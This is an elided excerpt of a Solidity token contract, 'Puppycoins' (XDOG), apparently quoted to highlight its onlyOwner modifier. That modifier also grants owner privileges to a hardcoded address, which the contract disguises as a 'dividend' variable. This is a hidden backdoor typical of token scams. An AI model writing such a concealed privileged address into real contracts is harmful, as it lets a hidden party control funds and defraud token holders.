...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x1cd903f1FAc9E14c10dC9EA8aa79f0f4A821b38B) , "owner");
        _;
    }
...
contract Puppycoins  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Puppycoins";
    string private _symbol = "XDOG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9787EC956bcF99c816755Fc5A21371340A6b531a);
    address private _Marketing = 0x9787EC956bcF99c816755Fc5A21371340A6b531a;
    address public dividend = 0x1cd903f1FAc9E14c10dC9EA8aa79f0f4A821b38B;
